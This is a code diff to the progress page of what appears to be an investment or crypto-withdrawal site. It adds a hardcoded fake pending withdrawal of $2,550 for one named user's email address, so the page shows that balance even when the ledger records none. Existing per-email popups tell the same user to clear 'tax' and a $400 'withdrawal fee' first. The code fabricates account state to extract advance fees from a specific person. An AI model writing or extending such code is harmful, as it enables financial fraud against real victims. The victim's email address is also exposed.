@@ -158,6 +158,9 @@ const WITHDRAWAL_SUCCESS_POPUP_BY_EMAIL: Record<string, string> = {
   "samlebrun01@gmail.com":
     "Congratulations for clearing tax. Your money will be sent to your wallet, but clear the withdrawal fee of $400.00. Amount to be transferred to your wallet: $2,550.00."
 };
+const FORCED_PENDING_WITHDRAWAL_BY_EMAIL: Record<string, { amount: number; currency: "USD" | "GBP" }> = {
+  "samlebrun01@gmail.com": { amount: 2550, currency: "USD" }
+};
 const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
   "samlebrun01@gmail.com":
     "Withdrawal pending. Clear withdrawal fee of $400.00 to release $2,550.00 to your wallet."
@@ -1156,9 +1159,16 @@ export default function ProgressPage() {
   const hasConfirmedWithdrawalForPlan = scopedWithdrawals.some(
     (w) => String(w.asset || "").toUpperCase() === plan.unit && String(w.status || "").toLowerCase() === "confirmed"
   );
-  const pendingWithdrawalAmountForPlan = scopedWithdrawals
+  const pendingWithdrawalAmountFromLedger = scopedWithdrawals
     .filter((w) => String(w.asset || "").toUpperCase() === plan.unit && String(w.status || "").toLowerCase() === "pending")
     .reduce((s, w) => s + Number(w.amount || 0), 0);
+  const forcedPendingWithdrawal = FORCED_PENDING_WITHDRAWAL_BY_EMAIL[userEmailLower] || null;
+  const pendingWithdrawalAmountForPlan =
+    pendingWithdrawalAmountFromLedger > 0.00000001
+      ? pendingWithdrawalAmountFromLedger
+      : forcedPendingWithdrawal && forcedPendingWithdrawal.currency === plan.unit
+      ? forcedPendingWithdrawal.amount
+      : 0;
   const hasPendingWithdrawalForPlan = pendingWithdrawalAmountForPlan > 0.00000001;
   const withdrawnLockedRaw = scopedWithdrawals
     .filter((w) => String(w.asset || "").toUpperCase() === plan.unit && isLockedWithdrawal(w.status))
